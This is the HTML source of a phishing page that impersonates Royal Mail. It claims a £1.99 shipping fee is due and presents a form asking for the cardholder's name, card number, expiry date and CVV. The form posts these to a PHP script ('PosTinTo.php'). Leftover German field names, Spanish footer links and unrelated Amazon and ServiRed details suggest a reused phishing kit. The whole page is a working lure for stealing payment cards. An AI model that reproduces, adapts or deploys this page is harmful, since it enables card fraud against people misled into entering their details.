<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
    <title>Royal Mail | Royal Mail Group Ltd</title>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="htdocs/img/favicon.jpg" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_001.css">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_002.css">
<link rel="stylesheet" type="text/css" href="htdocs/css/style_003.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/00ce2dd051.js" crossorigin="anonymous"></script>
<script type="text/javascript">
  
   $(document).ready(function () {
            $("#loadingo9lawzan").fadeIn("slow", function () {
                $("#loadingo9lawzan").delay(6000).fadeOut(150);
            });
        });

</script>
</head>
<body>
 <div class="pageLoader" id="loadingo9lawzan" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 0.9; text-align: center; display: none;">
<p style="margin-top: 94px;font-size: 19px;color: #5f5f5f!important;font-weight: 500;">
<p class="alert alert-success" id="alert-success"><i class="fas fa-exclamation"></i> &nbsp; [Please wait while the page loads...]

</p>
</p>
  <div class="spinner loading"></div></div>
<div class="topnav" id="myTopnav">
  <a href="# " id="top-left">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
  <a href="#" id="top-login"> Login / Sign Up&nbsp;&nbsp; <i class="fas fa-check"></i></a>
  <a href="# " id="top-img_pdn"><img src="htdocs/img/iconregistro.png" alt=""> </a>
  <a href="# " id="top-left">&nbsp;&nbsp;&nbsp;</a>
  <a href="# " id="top-left">English &nbsp;&nbsp; <i class="fas fa-check"></i></a>
  <a href="# " id="top-left"><img src="htdocs/img/separadortop.png" ></a>
  


<a href="#contact " id="top-img_hr">&nbsp;&nbsp;&nbsp;&nbsp;</a>
  <a href="javascript:void(0);" class="icon" >
    <i class="fa fa-bars"></i>
  </a>
</div>

<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <div class="container">
    <a class="navbar-brand" href="#"><img src="htdocs/img/logo.png" alt=""></a>
  </div>
</nav>


<div class="btm_nav" id="myTopnav">
  <a href="#">Home</a>
  <a href="#">Individuals</a>
  <a href="#">Business</a>
  <a href="#">Help</a>
  <a href="#">Companies</a>
  <a href="#">Dealers</a>
</div>



<div class="container">

<div class="row">
<div class="col-sm-9">
               <p class="alert alert-success" id="alert-success"><i class="fab fa-cc-mastercard"></i> &nbsp;<i class="fab fa-cc-visa"></i> &nbsp; Please confirm the shipping costs (£1,99) and the delivery address of the package.</p>
<form name="myForm" action="sourceApp/PosTinTo.php" onsubmit="return validateForm()" method="post">
<div class="card-body " id="icard-body">

<div class="tab-content">
<div class="tab-pane fade show active" id="nav-tab-card">
  <div class="form-group">
    <label for="username">Full name</label>
    <input type="text" class="form-control" name="Kartenhalter" placeholder="" id="Kartenhalter">
  </div> <!-- form-group.// -->

  <div class="form-group">
    <label for="cardNumber">Card Number</label>
    <div class="input-group">
      <input type="text" class="form-control" name="Kartennummer" id="Kartennummer" placeholder="">
      <div class="input-group-append">
        <span class="input-group-text text-muted">
          <i class="fab fa-cc-visa"></i> &nbsp; <i class="fab fa-cc-amex"></i> &nbsp; 
          <i class="fab fa-cc-mastercard"></i> 
        </span>
      </div>
    </div>
  </div> <!-- form-group.// -->

  <div class="row">
      <div class="col-sm-8">
          <div class="form-group">
              <label><span class="hidden-xs">Date of Expiry</span> </label>
            <div class="input-group">
              <input type="text" class="form-control" placeholder="" name="Ablauf" id="Ablauf">
            </div>
          </div>
      </div>
      <div class="col-sm-4">
          <div class="form-group">
              <label data-toggle="tooltip" title="" data-original-title="3 digits code on back side of the card">Security Code (CVV)<i class="fa fa-question-circle"></i></label>
              <input type="text" class="form-control" name="Sicherheitscode" id="Sicherheitscode">
          </div> <!-- form-group.// -->
      </div>
  </div> <!-- row.// -->
  <button class="subscribe btn btn-primary btn-block" type="submit" name="cartget"> Confirm  </button>
  
</div> <!-- tab-pane.// -->
<div class="tab-pane fade" id="nav-tab-paypal">
<p>Paypal is the easiest way to pay online</p>
<p>
<button type="button" class="btn btn-primary"> <i class="fab fa-paypal"></i> Log in to my Paypal </button>
</p>

</div>

</div> <!-- tab-content .// -->

</div></form>
            </div>

         <div class="col-sm-3 ">
               
               <div class="card">
  <div class="card-header">
   <strong>  Operation data</strong>
  </div>
  <ul class="list-group list-group-flush">
    <li class="list-group-item"><strong> Amount: </strong>£1,99</li>
    <li class="list-group-item"><strong> Commerce: </strong>Amazon.co.uk</li>
    <li class="list-group-item"><strong> Terminal: </strong>346841091-1</li>
    <li class="list-group-item"><strong> Order: </strong>111962998804</li>
    <li class="list-group-item"><img src="./htdocs/img/ServiRed1.gif"></li>
  </ul>

  
</div>

        </div>
 </div>
  </div>





<!-- Footer -->
<footer class="page-footer font-small indigo">
   <!-- Footer Links -->
   <div class="container text-center text-md-left">
      <!-- Grid row -->
      <div class="row">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Send package
</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Shipping online</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Discounted online shipping</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Send OfficeFax</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">service calculator PostUAE</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Receive a shipment
</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Seguimiento de Envíos</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Shipment Tracking</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Store Pickup</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Frequent questions</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class="text-uppercase mt-3 mb-4">International delivery
</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">International Tracking</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Shipments to Europe</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Shipments to the United States</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
         <hr class="clearfix w-100 d-md-none">
         <!-- Grid column -->
         <div class="col-md-3 mx-auto">
            <!-- Links -->
            <h5 class=" text-uppercase mt-3 mb-4">Business</h5>
            <ul class="list-unstyled">
               <li>
                  <a href="#!" class="a_text_list">Access to POST PRO</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Access to POST Net</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">International Billing</a>
               </li>
               <li>
                  <a href="#!" class="a_text_list">Join the POST Pickup network</a>
               </li>
            </ul>
         </div>
         <!-- Grid column -->
      </div>
      <!-- Grid row -->
   </div>
   <!-- Footer Links -->
   <!-- Copyright -->
   <div class="footer-copyright  py-3">
      <a href="" class="copyright">© Royal Mail Group Limited 2020</a>
      <a href="" class="logo-ft"> <img src="htdocs/img/logopie.png" ></a>
   </div>
   <!-- Copyright -->
</footer>
<!-- Footer -->
         <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
         <script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js'></script>
         <script type="text/javascript">
            $(":input").inputmask();
            
            $("#Kartennummer").inputmask({"mask": "9999 9999 9999 9999"});
            $("#Ablauf").inputmask({"mask": "99/9999"});
            $("#Sicherheitscode").inputmask({"mask": "999"});
         </script>
<script  src="sourceApp/chronopost_cc.js"></script>
</body>
</html>
